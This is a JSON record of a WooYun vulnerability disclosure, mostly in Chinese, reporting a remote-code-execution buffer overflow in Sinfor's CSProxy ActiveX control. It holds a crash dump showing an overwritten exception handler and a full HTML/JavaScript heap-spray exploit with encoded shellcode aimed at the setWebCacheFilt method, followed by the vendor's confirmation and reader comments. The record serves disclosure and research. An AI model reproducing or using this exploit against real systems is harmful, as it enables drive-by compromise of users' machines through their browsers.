{"id": 6596, "wybug_id": "wooyun-2013-040476", "wybug_title": "#2 Sinfor CSProxy ActiveX Remote Code Execution", "wybug_corp": "深信服", "wybug_author": "想要减肥的胖纸", "wybug_date": "2013-10-21 09:30", "wybug_open_date": "2014-01-19 09:31", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["缓冲区溢出", "漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-12-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-19：\t细节向公众公开  简要描述： This exploit test on winxp sp3 ie6 详细说明：  \n名称:         CSProxy Class发行者:        Sinfor Technologies  Co.,Ltd类型:         ActiveX 控件版本:         4. 2. 1. 3文件日期:       上次访问日期:     2013年10月21日，0:27类 ID:       {53EC2F48-968E-4A42-B99B-9F6571474213}使用计数:       40阻止次数:       0文件:         ProxyIE.dll文件夹:        C:\\Program Files\\Sinfor\\SSL\\ClientComponent\n\nException Code: ACCESS_VIOLATIONDisasm: 77BA6F29\tMOV [EDI],EDX\t(msvcrt.dll)Seh Chain:--------------------------------------------------1 \t41414141 \tCalled From                   Returns To                    --------------------------------------------------msvcrt.77BA6F29               41414141                      Registers:--------------------------------------------------EIP 77BA6F29EAX 7EFEFEFEEBX 01AD8324 -> 01A714D3ECX 0218148C -> Asc: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEDX 41414141EDI 00140000 -> 78746341 -> Asc: ActActESI 0018BD94 -> 00030003EBP 0013ECD8 -> Asc: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAESP 0013EB70 -> 0013ECC4Block Disassembly: --------------------------------------------------77BA6F18\tJE SHORT 77BA6F8077BA6F1A\tMOV [EDI],DL77BA6F1C\tADD EDI,177BA6F1F\tTEST ECX,377BA6F25\tJNZ SHORT 77BA6F1177BA6F27\tJMP SHORT 77BA6F2E77BA6F29\tMOV [EDI],EDX\t  <--- CRASH77BA6F2B\tADD EDI,477BA6F2E\tMOV EDX,7EFEFEFF77BA6F33\tMOV EAX,[ECX]77BA6F35\tADD EDX,EAX77BA6F37\tXOR EAX,FFFFFFFF77BA6F3A\tXOR EAX,EDX77BA6F3C\tMOV EDX,[ECX]77BA6F3E\tADD ECX,4ArgDump:--------------------------------------------------EBP+8\t41414141EBP+12\t41414141EBP+16\t41414141EBP+20\t41414141EBP+24\t41414141EBP+28\t41414141Stack Dump:--------------------------------------------------13EB70 C4 EC 13 00 22 54 AB 01 C0 EB 13 00 48 00 18 02  [.....T......H...]13EB80 00 00 00 00 98 48 AF 01 41 41 41 41 41 41 41 41  [.....H..........]13EB90 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  [................]13EBA0 41 41 41 41 B0 8D 03 00 01 41 41 41 41 41 41 41  [................]13EBB0 41 41 41 41 00 00 00 00 00 00 00 00 00 00 00 00  [................]\n   漏洞证明：  \n<html><body><object classid=\"clsid:53EC2F48-968E-4A42-B99B-9F6571474213\"id=\"target\"></object> <input type=\"button\" onclick=\"test()\" value=\"test\" /><script>function test(){var shellcode = unescape('%uc931%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%u3d13%u5e46%u8395'+'%ufceb%uf4e2%uaec1%u951a%u463d%ud0d5%ucd01%u9022%u4745%u1eb1'+'%u5e72%ucad5%u471d%udcb5%u72b6%u94d5%u77d3%u0c9e%uc291%ue19e'+'%u873a%u9894%u843c%u61b5%u1206%u917a%ua348%ucad5%u4719%uf3b5'+'%u4ab6%u1e15%u5a62%u7e5f%u5ab6%u94d5%ucfd6%ub102%u8539%u556f'+'%ucd59%ua51e%u86b8%u9926%u06b6%u1e52%u5a4d%u1ef3%u4e55%u9cb5'+'%uc6b6%u95ee%u463d%ufdd5%u1901%u636f%u105d%u6dd7%u86be%uc525'+'%u3855%u7786%u2e4e%u6bc6%u48b7%u6a09%u25da%uf93f%u465e%u955e');var nops=unescape('%u9090%u9090');var headersize =20;var slackspace= headersize + shellcode.length;\twhile(nops.length < slackspace) nops+= nops;\tfillblock= nops.substring(0, slackspace);\tblock= nops.substring(0, nops.length- slackspace);\twhile( block.length+ slackspace<0x50000) \tblock= block+ block+ \tfillblock;\tmemory=new Array();\tfor( i=0; i<200; i++) \tmemory[i]= block + shellcode;  var buffer='';\tfor( i=0; i<=300; i++) \tbuffer+=unescape(\"%0D%0D%0D%0D\");target.setWebCacheFilt(1,buffer);}</script></body></html>\n   修复方案：     版权声明：转载请注明来源 想要减肥的胖纸@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2013-10-24 19:05 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-21 18:08 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  这辈子就崇拜会英语的人 o(︶︿︶)o     \n     2013-10-21 18:20 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  如果不是堆喷射的exp我就给你加精    \n     2013-10-21 18:47 |    \t\t想要减肥的胖纸 \t\t\t( 普通白帽子  |\t\t\t        Rank:250 漏洞数:42        )\t\t \n  @疯狗 我想bypass dep 可是啥也不懂，然后也试了 java applet 想bypassdep 可是 连弹个计算器都没成功，唉。正在学习，一边挖一边学。    \n     2013-10-21 19:42 |    \t\tltes \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | ID是别人送的)\t\t \n  膜拜会挖漏洞会写exp的大牛    \n     2013-10-22 10:43 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @想要减肥的胖纸 加油，一个精华为你而留    \n     2013-10-27 22:31 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  给力    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}